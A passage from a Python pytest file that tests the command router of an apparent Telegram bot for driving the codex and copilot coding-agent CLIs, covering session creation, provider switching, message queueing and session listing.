        if on_progress is not None:
            on_progress(
                AgentProgressInfo(
                    command=("copilot", "chat"),
                    elapsed_seconds=5.0,
                    text='"/bin/zsh -lc \\"rg -n foo\\""',
                    source="stdout",
                )
            )
            on_progress(
                AgentProgressInfo(
                    command=("copilot", "chat"),
                    elapsed_seconds=8.0,
                    text='"/bin/zsh -lc \\"pytest -q\\""',
                    source="stdout",
                )
            )
        return AgentRunResult(
            session_id=session_id,
            success=True,
            assistant_text="done",
            error_message=None,
            raw_events=[],
        )


class BlockingRunner(DummyRunner):
    def __init__(self):
        super().__init__()
        self._condition = threading.Condition()
        self._started_count = 0
        self._released_count = 0

    def has_running_process(self, _project_path):
        with self._condition:
            return self._started_count > self._released_count

    def wait_started(self, count: int, timeout: float = 1.0) -> bool:
        with self._condition:
            return self._condition.wait_for(lambda: self._started_count >= count, timeout=timeout)

    def release_next(self) -> None:
        with self._condition:
            self._released_count += 1
            self._condition.notify_all()

    def resume_session(
        self,
        provider,
        session_id,
        project_path,
        user_message,
        *,
        skip_git_repo_check=False,
        image_paths=(),
        on_stall=None,
        on_progress=None,
    ):
        self.resume_calls.append(
            {
                "provider": provider,
                "session_id": session_id,
                "project_path": project_path,
                "user_message": user_message,
                "skip_git_repo_check": skip_git_repo_check,
                "image_paths": image_paths,
                "on_stall": on_stall,
                "on_progress": on_progress,
            }
        )
        with self._condition:
            self._started_count += 1
            my_run = self._started_count
            self._condition.notify_all()
            self._condition.wait_for(lambda: self._released_count >= my_run, timeout=30)
        return AgentRunResult(
            session_id=session_id,
            success=True,
            assistant_text="done",
            error_message=None,
            raw_events=[],
        )


class AbortableBlockingRunner(BlockingRunner):
    def __init__(self):
        super().__init__()
        self._abort_current = False

    def abort_running_process(self, _project_path):
        with self._condition:
            if self._started_count <= self._released_count:
                return False
            self._abort_current = True
            self._released_count += 1
            self._condition.notify_all()
            return True

    def resume_session(
        self,
        provider,
        session_id,
        project_path,
        user_message,
        *,
        skip_git_repo_check=False,
        image_paths=(),
        on_stall=None,
        on_progress=None,
    ):
        self.resume_calls.append(
            {
                "provider": provider,
                "session_id": session_id,
                "project_path": project_path,
                "user_message": user_message,
                "skip_git_repo_check": skip_git_repo_check,
                "image_paths": image_paths,
                "on_stall": on_stall,
                "on_progress": on_progress,
            }
        )
        with self._condition:
            self._started_count += 1
            my_run = self._started_count
            self._condition.notify_all()
            self._condition.wait_for(lambda: self._released_count >= my_run, timeout=30)
            if self._abort_current:
                self._abort_current = False
                return AgentRunResult(
                    session_id=session_id,
                    success=False,
                    assistant_text="",
                    error_message=None,
                    raw_events=[],
                    error_code="agent_aborted",
                )
        return AgentRunResult(
            session_id=session_id,
            success=True,
            assistant_text="done",
            error_message=None,
            raw_events=[],
        )


def test_new_command_supports_copilot_provider(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_current_provider("bot-a", 123, "copilot")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router._provider_available = lambda provider: True

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["my-session"], bot=bot)

    asyncio.run(router.handle_new(update, context))
    state = store.get_chat_state("bot-a", 123)
    sess = state["sessions"][state["active_session_id"]]
    assert sess["provider"] == "copilot"
    assert bot.messages[0][1] == "Creating session..."
    assert "Session ID: sess_abc123" in bot.messages[-1][1]


def test_new_command_skips_git_repo_check_for_trusted_project(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.trust_project("backend")
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_current_provider("bot-a", 123, "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router._provider_available = lambda provider: True

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["my-session"], bot=bot)

    asyncio.run(router.handle_new(update, context))

    assert runner.create_calls[-1]["skip_git_repo_check"] is True
    assert bot.messages[0][1] == "Creating session..."
    assert "Session ID: sess_abc123" in bot.messages[-1][1]


def test_new_command_rejects_duplicate_session_name(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_current_provider("bot-a", 123, "codex")
    store.create_session("bot-a", 123, "sess_existing", "my-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router._provider_available = lambda provider: True

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["my-session"], bot=bot)

    asyncio.run(router.handle_new(update, context))

    assert runner.create_calls == []
    assert "Session name already exists: my-session" in bot.messages[-1][1]


def test_new_command_reports_stalled_agent_process(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = StallingRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_current_provider("bot-a", 123, "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router._provider_available = lambda provider: True

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["my-session"], bot=bot)

    asyncio.run(router.handle_new(update, context))

    assert any("Replacement session creation appears stuck." in message[1] for message in bot.messages)
    assert any("hidden permission dialog" in message[1] for message in bot.messages)


def test_new_command_prompts_for_provider_when_not_selected(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router._provider_available = lambda provider: True

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["my-session"], bot=bot)

    asyncio.run(router.handle_new(update, context))

    assert runner.create_calls == []
    assert "Provider selection is required" in bot.messages[-1][1]
    assert bot.messages[-1][3] is not None
    assert store.get_chat_state("bot-a", 123)["pending_action"]["kind"] == "new_session"


def test_new_without_name_uses_new_session_as_default_name(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_current_provider("bot-a", 123, "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router._provider_available = lambda provider: True

    update = make_update(text="/new")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_new(update, context))

    state = store.get_chat_state("bot-a", 123)
    assert state["sessions"]["sess_abc123"]["name"] == "sess_abc123"
    assert "Session created successfully: sess_abc123" in bot.messages[-1][1]
    assert runner.create_calls[-1]["user_message"] == "Create session: new session"


def test_new_without_name_ignores_existing_new_session_labels(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_current_provider("bot-a", 123, "codex")
    store.create_session("bot-a", 123, "sess_existing", "new session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router._provider_available = lambda provider: True

    update = make_update(text="/new")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_new(update, context))

    state = store.get_chat_state("bot-a", 123)
    assert state["sessions"]["sess_abc123"]["name"] == "sess_abc123"
    assert "Session created successfully: sess_abc123" in bot.messages[-1][1]


def test_plain_text_create_session_new_session_uses_unnamed_flow(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_current_provider("bot-a", 123, "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router._provider_available = lambda provider: True

    update = make_update(text="Create session: new session")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    state = store.get_chat_state("bot-a", 123)
    assert state["sessions"]["sess_abc123"]["name"] == "sess_abc123"
    assert runner.create_calls[-1]["user_message"] == "Create session: new session"


def test_plain_text_create_session_with_name_matches_new_command(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_current_provider("bot-a", 123, "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router._provider_available = lambda provider: True

    update = make_update(text="Create session: release prep")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    state = store.get_chat_state("bot-a", 123)
    assert state["sessions"]["sess_abc123"]["name"] == "release prep"
    assert runner.create_calls[-1]["user_message"] == "Create session: release prep"


def test_provider_command_sends_inline_buttons(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_provider("bot-a", 123, "copilot")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router._provider_available = lambda provider: provider == "copilot"

    update = make_update(text="/provider")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_provider(update, context))

    assert len(bot.messages) == 1
    message = bot.messages[0]
    assert "Current provider: copilot" in message[1]
    keyboard = message[3]
    assert keyboard is not None
    buttons = keyboard.inline_keyboard[0]
    assert buttons[0].callback_data == "provider:set:codex"
    assert buttons[1].callback_data == "provider:set:copilot"
    assert "missing" in buttons[0].text
    assert "current" in buttons[1].text
    assert buttons[0].api_kwargs == {"style": "success"}
    assert buttons[1].api_kwargs == {"style": "success"}


def test_provider_callback_updates_current_provider(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router._provider_available = lambda provider: True

    answers = []
    edited = []
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=SimpleNamespace(
            data="provider:set:copilot",
            answer=None,
            edit_message_text=None,
        ),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    async def fake_answer():
        answers.append("answered")

    async def fake_edit(text):
        edited.append(text)

    update.callback_query.answer = fake_answer
    update.callback_query.edit_message_text = fake_edit

    asyncio.run(router.handle_provider_callback(update, context))

    assert answers == ["answered"]
    assert edited == ["Current provider set to: copilot"]
    assert store.get_chat_state("bot-a", 123)["current_provider"] == "copilot"


def test_provider_callback_continues_pending_new_session(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_pending_action("bot-a", 123, {"kind": "new_session", "session_name": "my-session"})
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router._provider_available = lambda provider: True

    edited = []
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=SimpleNamespace(
            data="provider:set:copilot",
            answer=None,
            edit_message_text=None,
        ),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    async def fake_answer():
        return None

    async def fake_edit(text):
        edited.append(text)

    update.callback_query.answer = fake_answer
    update.callback_query.edit_message_text = fake_edit

    asyncio.run(router.handle_provider_callback(update, context))

    assert edited == ["Current provider set to: copilot"]
    assert runner.create_calls[-1]["provider"] == "copilot"
    state = store.get_chat_state("bot-a", 123)
    assert "pending_action" not in state
    assert state["sessions"][state["active_session_id"]]["provider"] == "copilot"


def test_text_message_is_queued_while_new_session_prerequisites_are_pending(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router._provider_available = lambda provider: True

    async def exercise():
        bot = FakeBot()
        context = SimpleNamespace(args=[], bot=bot)

        await router.handle_new(make_update(text="/new my-session"), SimpleNamespace(args=["my-session"], bot=bot))
        state = store.get_chat_state("bot-a", 123)
        assert state["pending_action"]["kind"] == "new_session"

        await router.handle_message(make_update(text="follow-up question", message_id=202), context)

        state = store.get_chat_state("bot-a", 123)
        assert state["pending_action"]["kind"] == "new_session"
        assert any("Question queued as Q1." in entry["text"] for entry in bot.sent_messages)
        assert runner.resume_calls == []

        query = SimpleNamespace(data="provider:set:codex", answer=None, edit_message_text=None)
        callback_update = SimpleNamespace(
            effective_chat=SimpleNamespace(id=123, type="private"),
            callback_query=query,
            message=SimpleNamespace(text=None, photo=None, caption=None, message_id=None),
        )

        async def fake_answer():
            return None

        async def fake_edit(_text, reply_markup=None):
            return None

        query.answer = fake_answer
        query.edit_message_text = fake_edit

        await router.handle_provider_callback(callback_update, context)

        assert len(runner.create_calls) == 1
        assert len(runner.resume_calls) == 1
        assert runner.resume_calls[0]["user_message"] == "follow-up question"

    asyncio.run(exercise())


def test_voice_message_is_queued_while_new_session_prerequisites_are_pending(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router._provider_available = lambda provider: True
    router.speech_to_text.enabled = True
    router.speech_to_text.transcribe_file = lambda _path: SimpleNamespace(text="voice follow-up")

    async def exercise():
        bot = FakeBot()
        context = SimpleNamespace(args=[], bot=bot)

        await router.handle_new(make_update(text="/new my-session"), SimpleNamespace(args=["my-session"], bot=bot))
        state = store.get_chat_state("bot-a", 123)
        assert state["pending_action"]["kind"] == "new_session"

        voice_update = SimpleNamespace(
            effective_chat=SimpleNamespace(id=123, type="private"),
            message=SimpleNamespace(
                text=None,
                photo=None,
                caption=None,
                message_id=303,
                voice=FakeVoiceMessage(FakeTelegramFile(b"voice-bytes", "voice/note.ogg")),
            ),
        )
        await router.handle_voice(voice_update, context)

        state = store.get_chat_state("bot-a", 123)
        assert state["pending_action"]["kind"] == "new_session"
        assert any("Queued as Q1." in entry["text"] for entry in bot.sent_messages)
        assert runner.resume_calls == []

        query = SimpleNamespace(data="provider:set:codex", answer=None, edit_message_text=None)
        callback_update = SimpleNamespace(
            effective_chat=SimpleNamespace(id=123, type="private"),
            callback_query=query,
            message=SimpleNamespace(text=None, photo=None, caption=None, message_id=None),
        )

        async def fake_answer():
            return None

        async def fake_edit(_text, reply_markup=None):
            return None

        query.answer = fake_answer
        query.edit_message_text = fake_edit

        await router.handle_provider_callback(callback_update, context)

        assert len(runner.create_calls) == 1
        assert len(runner.resume_calls) == 1
        assert runner.resume_calls[0]["user_message"] == "voice follow-up"

    asyncio.run(exercise())


def test_provider_switch_auto_creates_session_named_by_session_id(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_current_provider("bot-a", 123, "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router._provider_available = lambda provider: True

    edited = []
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=SimpleNamespace(
            data="provider:set:copilot",
            answer=None,
            edit_message_text=None,
        ),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    async def fake_answer():
        return None

    async def fake_edit(text):
        edited.append(text)

    update.callback_query.answer = fake_answer
    update.callback_query.edit_message_text = fake_edit

    asyncio.run(router.handle_provider_callback(update, context))

    state = store.get_chat_state("bot-a", 123)
    assert edited == ["Current provider set to: copilot"]
    assert state["sessions"][state["active_session_id"]]["name"] == "sess_abc123"
    assert state["sessions"][state["active_session_id"]]["provider"] == "copilot"


def test_provider_availability_uses_cache(tmp_path: Path, monkeypatch):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    calls = []

    def fake_which(_name):
        calls.append(_name)
        return "/usr/local/bin/codex"

    monkeypatch.setattr("coding_agent_telegram.router.session_commands.shutil.which", fake_which)

    assert router._provider_available("codex") is True
    assert router._provider_available("codex") is True
    assert calls == [cfg.codex_bin]


def test_missing_provider_availability_cache_expires_faster(tmp_path: Path, monkeypatch):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    calls = []

    def fake_which(_name):
        calls.append(_name)
        return None if len(calls) == 1 else "/usr/local/bin/copilot"

    monkeypatch.setattr("coding_agent_telegram.router.session_commands.shutil.which", fake_which)

    assert router._provider_available("copilot") is False
    cached_at, available, bin_name = router._provider_availability_cache["copilot"]
    router._provider_availability_cache["copilot"] = (
        cached_at - router.PROVIDER_BIN_MISSING_CACHE_TTL_SECONDS - 1,
        available,
        bin_name,
    )

    assert router._provider_available("copilot") is True
    assert calls == [cfg.copilot_bin, cfg.copilot_bin]


def test_switch_lists_latest_10_sessions_by_default(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    for idx in range(12):
        store.create_session("bot-a", 123, f"sess_{idx}", f"session-{idx}", "backend", "codex")

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_switch(update, context))

    message = bot.messages[-1][1]
    assert "Available sessions (page 1/3):" in message
    assert "🤖 = Bot managed session" in message
    assert "session-9" in message
    assert "session-7" in message
    assert "session-6" not in message
    assert "session-4" not in message
    assert "Pages: /switch page 1 ... /switch page 3" in message
    assert "/switch &lt;session_id&gt;" in message


def test_switch_lists_requested_page(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    for idx in range(12):
        store.create_session("bot-a", 123, f"sess_{idx}", f"session-{idx}", "backend", "codex")

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["page", "2"], bot=bot)

    asyncio.run(router.handle_switch(update, context))

    message = bot.messages[-1][1]
    assert "Available sessions (page 2/3):" in message
    assert "session-4" in message
    assert "session-2" in message
    assert "session-9" not in message


def test_switch_lists_mixed_bot_and_native_project_sessions_with_legend(tmp_path: Path, monkeypatch):
    home = tmp_path / "home"
    monkeypatch.setenv("HOME", str(home))
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_current_provider("bot-a", 123, "codex")
    store.create_session("bot-a", 123, "sess_bot", "bot-session", "backend", "codex", branch_name="feature-1")
    seed_codex_native_session(
        home,
        session_id="sess_native_codex",
        cwd=backend,
        title="Native codex review",
        branch="enhancement",
        created_at=1_700_000_000,
        updated_at=1_700_000_010,
    )
    seed_copilot_native_session(
        home,
        session_id="sess_native_copilot",
        branch="enhancement",
        created_at="2026-03-27T01:00:00Z",
        updated_at="2026-03-27T02:00:00Z",
        summary="Native copilot review",
        cwd=backend,
    )
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update(text="/switch")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_switch(update, context))

    message = bot.messages[-1][1]
    assert "🤖 = Bot managed session" in message
    assert "💻 = native CLI session" in message
    assert "Current project filter for native sessions: <code>backend</code>" in message
    assert "🤖 bot-session" in message
    assert "💻 Native codex review" in message
    assert "initialized: Native codex review" in message


def test_switch_lists_only_current_provider_native_sessions(tmp_path: Path, monkeypatch):
    home = tmp_path / "home"
    monkeypatch.setenv("HOME", str(home))
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_current_provider("bot-a", 123, "copilot")
    seed_codex_native_session(
        home,
        session_id="sess_native_codex",
        cwd=backend,
        title="Native codex review",
        branch="enhancement",
        created_at=1_700_000_000,
        updated_at=1_700_000_010,
    )
    seed_copilot_native_session(
        home,
        session_id="sess_native_copilot",
        branch="enhancement",
        created_at="2026-03-27T01:00:00Z",
        updated_at="2026-03-27T02:00:00Z",
        summary="Native copilot review",
        cwd=backend,
    )
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update(text="/switch")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_switch(update, context))

    message = bot.messages[-1][1]
    assert "💻 Native copilot review" in message
    assert "initialized: Native copilot review" in message
    assert "💻 Native codex review" not in message


def test_switch_uses_human_fallback_for_copilot_session_without_summary(tmp_path: Path, monkeypatch):
    home = tmp_path / "home"
    monkeypatch.setenv("HOME", str(home))
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_current_provider("bot-a", 123, "copilot")
    seed_copilot_native_session(
        home,
        session_id="a3293772-2567-42a4-af26-bf61f0e33792",
        branch="enhancement",
        created_at="2026-03-26T16:56:05.485Z",
        updated_at="2026-03-26T16:56:05.542Z",
        summary="",
        with_events=False,
        cwd=backend,
    )
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update(text="/switch")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_switch(update, context))

    message = bot.messages[-1][1]
    assert "💻 Copilot session on enhancement" in message
    assert "initialized: Copilot session on enhancement" in message
    assert "💻 a3293772-2567-42a4-af26-bf61f0e33792" not in message


def test_switch_discovers_native_copilot_session_from_home_store(tmp_path: Path, monkeypatch):
    home = tmp_path / "home"
    monkeypatch.setenv("HOME", str(home))
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_current_provider("bot-a", 123, "copilot")
    seed_copilot_native_session(
        home,
        session_id="83d5cd02-0022-4b02-9ad0-47594ebe05ea",
        branch="feature-enhancements",
        created_at="2026-03-27T21:31:57.142Z",
        updated_at="2026-03-27T21:32:08.193Z",
        summary="pls scan the code quality",
        cwd=backend,
    )
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update(text="/switch")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_switch(update, context))

    message = bot.messages[-1][1]
    assert "💻 pls scan the code quality" in message
    assert "initialized: pls scan the code quality" in message


def test_switch_by_session_id_still_works(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_a", "session-a", "backend", "codex")
    store.create_session("bot-a", 123, "sess_b", "session-b", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["sess_a"], bot=bot)

    asyncio.run(router.handle_switch(update, context))

    assert "Switched to session: session-a" in bot.messages[-1][1]


def test_switch_imports_native_session_into_state_json(tmp_path: Path, monkeypatch):
    home = tmp_path / "home"
    monkeypatch.setenv("HOME", str(home))
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.set_current_project_folder("bot-a", 123, "backend")
    store.set_current_provider("bot-a", 123, "codex")
    seed_codex_native_session(
        home,
        session_id="sess_native_codex",
        cwd=backend,
        title="Native codex review",
        branch="enhancement",
        created_at=1_700_000_000,
        updated_at=1_700_000_010,
    )
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update(text="/switch sess_native_codex")
    bot = FakeBot()
    context = SimpleNamespace(args=["sess_native_codex"], bot=bot)

    asyncio.run(router.handle_switch(update, context))

    state = store.get_chat_state("bot-a", 123)
    assert state["active_session_id"] == "sess_native_codex"
    assert state["sessions"]["sess_native_codex"]["name"] == "Native codex review"
    assert "Source: native CLI session" in bot.messages[-1][1]
    assert "Imported into state.json." in bot.messages[-1][1]


def test_current_requires_active_session(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_current(update, context))

    assert "No active session." in bot.messages[-1][1]


def test_current_reports_active_session_details(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_a", "session-a", "backend", "codex", branch_name="feature-1")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_current(update, context))

    message = bot.messages[-1][1]
    assert "Current session: session-a" in message
    assert "Project: backend" in message
    assert "Provider: codex" in message
    assert "Branch: feature-1" in message


def test_switch_does_not_checkout_branch_immediately(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_a", "session-a", "backend", "codex", branch_name="missing-branch")
    store.create_session("bot-a", 123, "sess_b", "session-b", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(
        is_git_repo=True,
        current_branch="main",
        checkout_result=SimpleNamespace(success=False, message="Failed to checkout branch: missing-branch"),
    )

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["sess_a"], bot=bot)

    asyncio.run(router.handle_switch(update, context))

    assert "Switched to session: session-a" in bot.messages[-1][1]
    assert store.get_chat_state("bot-a", 123)["active_session_id"] == "sess_a"
    assert router.git.current_branch(backend) == "main"


def test_switch_rejects_missing_project_folder(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_a", "session-a", "deleted-project", "codex")
    store.create_session("bot-a", 123, "sess_b", "session-b", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["sess_a"], bot=bot)

    asyncio.run(router.handle_switch(update, context))

    assert "Project folder no longer exists for this session: deleted-project" in bot.messages[-1][1]
    assert store.get_chat_state("bot-a", 123)["active_session_id"] == "sess_b"


def test_send_text_uses_html_parse_mode(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = make_update()
    bot = FakeBot()
    context = SimpleNamespace(args=["backend"], bot=bot)

    asyncio.run(router.handle_project(update, context))

    assert bot.messages[-1][2] == "HTML"


def test_photo_message_is_saved_and_forwarded_to_codex(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
